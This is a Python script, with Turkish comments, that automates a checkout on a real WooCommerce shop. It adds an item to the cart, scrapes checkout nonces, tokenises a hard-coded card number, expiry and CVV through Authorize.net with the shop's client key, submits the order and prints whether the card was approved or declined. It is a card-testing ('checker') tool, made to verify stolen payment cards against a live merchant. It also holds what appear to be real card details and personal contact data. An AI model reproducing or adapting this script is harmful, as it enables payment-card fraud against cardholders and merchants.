import requests
import re

r = requests.session()




headers = {
    'authority': 'sensonics.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'origin': 'https://sensonics.com',
    'referer': 'https://sensonics.com/product/b-sit-scoring-key/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

files = {
    'quantity': (None, '1'),
    'add-to-cart': (None, '203873'),
}

response = r.post('https://sensonics.com/product/b-sit-scoring-key/', headers=headers, files=files)






headers = {
    'authority': 'sensonics.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'referer': 'https://sensonics.com/product/b-sit-scoring-key/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

response = r.get('https://sensonics.com/cart/', headers=headers)






headers = {
    'authority': 'sensonics.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

response = r.get('https://sensonics.com/checkout/', headers=headers)


sec=re.findall(r'"update_order_review_nonce":"(.*?)"',response.text)[0]




nonce = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1)





headers = {
    'authority': 'sensonics.com',
    'accept': '*/*',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://sensonics.com',
    'referer': 'https://sensonics.com/checkout/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

params = {
    'wc-ajax': 'update_order_review',
}

data = f'security={sec}&payment_method=authorize_net_cim_credit_card&country=US&state=AZ&postcode=85001&city=Phoenix+&address=Essek+kerem+data+vur&address_2=&s_country=US&s_state=AZ&s_postcode=85001&s_city=Phoenix+&s_address=Essek+kerem+data+vur&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fsensonics.com%252Fmy-account-2%252F%253Fsrsltid%253DAfmBOooZQEbjsgfU6jjvPHv3h8UeLPCC4wLkutvhYBFxUjsW4J5LM7hB%26wc_order_attribution_session_start_time%3D2025-09-02%252019%253A01%253A11%26wc_order_attribution_session_pages%3D18%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26billing_first_name%3DKerem%26billing_last_name%3DPiro%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3DEssek%2520kerem%2520data%2520vur%26billing_address_2%3D%26billing_city%3DPhoenix%2520%26billing_state%3DAZ%26billing_postcode%3D85001%26billing_phone%3D%26billing_email%3D%26account_password%3D%26shipping_first_name%3D%26shipping_last_name%3D%26shipping_company%3D%26shipping_country%3D%26shipping_address_1%3D%26shipping_address_2%3D%26shipping_city%3D%26shipping_state%3D%26shipping_postcode%3D%26order_comments%3D%26payment_method%3Dauthorize_net_cim_credit_card%26wc-authorize-net-cim-credit-card-context%3Dshortcode%26wc-authorize-net-cim-credit-card-expiry%3D%26wc-authorize-net-cim-credit-card-payment-nonce%3D%26wc-authorize-net-cim-credit-card-payment-descriptor%3D%26wc-authorize-net-cim-credit-card-last-four%3D%26wc-authorize-net-cim-credit-card-card-type%3D%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{nonce}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review'

response = r.post('https://sensonics.com/', params=params, headers=headers, data=data)



import requests

headers = {
    'Accept': '*/*',
    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json; charset=UTF-8',
    'Origin': 'https://sensonics.com',
    'Referer': 'https://sensonics.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

json_data = {
    'securePaymentContainerRequest': {
        'merchantAuthentication': {
            'name': '8WYp6b7P',
            'clientKey': '52v9f837ubtXjL76S57U3Rx7ewdp5Pd2u2jAX96aV8fXa4EsDXGYssR3UHNp7gnA',
        },
        'data': {
            'type': 'TOKEN',
            'id': 'a516301e-c7ca-2e1b-aabe-9543e262d597',
            'token': {
                'cardNumber': '4785002949803356',
                'expirationDate': '042029',
                'cardCode': '154',
                'zip': '85001',
                'fullName': 'Kerem Piro',
            },
        },
    },
}

response = requests.post('https://api2.authorize.net/xml/v1/request.api', headers=headers, json=json_data)


# Extract token
token_match = re.search(r'"dataValue":"(.*?)"', response.text)

    
    
    
    
    



headers = {
    'authority': 'sensonics.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://sensonics.com',
    'referer': 'https://sensonics.com/checkout/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

params = {
    'wc-ajax': 'checkout',
}

data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fsensonics.com%2Fmy-account-2%2F%3Fsrsltid%3DAfmBOooZQEbjsgfU6jjvPHv3h8UeLPCC4wLkutvhYBFxUjsW4J5LM7hB&wc_order_attribution_session_start_time=2025-09-02+19%3A01%3A11&wc_order_attribution_session_pages=18&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36&billing_first_name=Kerem&billing_last_name=Piro&billing_company=&billing_country=US&billing_address_1=Essek+kerem+data+vur&billing_address_2=&billing_city=Phoenix+&billing_state=AZ&billing_postcode=85001&billing_phone=27356646864&billing_email=bababenim67767%40gmail.com&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=flat_rate%3A9&payment_method=authorize_net_cim_credit_card&wc-authorize-net-cim-credit-card-context=shortcode&wc-authorize-net-cim-credit-card-expiry=04+%2F+29&wc-authorize-net-cim-credit-card-payment-nonce={token_match}&wc-authorize-net-cim-credit-card-payment-descriptor=COMMON.ACCEPT.INAPP.PAYMENT&wc-authorize-net-cim-credit-card-last-four=3356&wc-authorize-net-cim-credit-card-card-type=visa&terms=on&terms-field=1&woocommerce-process-checkout-nonce={nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'

response = r.post('https://sensonics.com/', params=params, headers=headers, data=data)


from bs4 import BeautifulSoup
import json, html

raw = response.text

msg = None
approved = False

# 1) JSON ise önce messages alanını çek
try:
    obj = response.json()
except ValueError:
    obj = None

if obj and isinstance(obj.get("messages"), str):
    html_chunk = html.unescape(obj["messages"]).replace("\\/", "/")
    soup = BeautifulSoup(html_chunk, "html.parser")
    li = soup.find("li")
    if li:
        msg = li.get_text(strip=True)
    # Başarı kontrolü (result/success alanları)
    if str(obj.get("result", "")).lower() == "success" or obj.get("success") is True:
        approved = True
else:
    # 2) JSON değilse, kaçışları çöz ve direkt HTML parse et
    try:
        clean_html = raw.encode("utf-8").decode("unicode_escape")
    except Exception:
        clean_html = raw
    soup = BeautifulSoup(clean_html, "html.parser")
    li = soup.find("li")
    if li:
        msg = li.get_text(strip=True)
    if "success" in clean_html.lower():
        approved = True

# 3) Çıktı
if msg:
    print(msg)                # ör: The card was declined.
elif approved:
    print("APPROVED ✅")
else:
    print("Mesaj bulunamadı")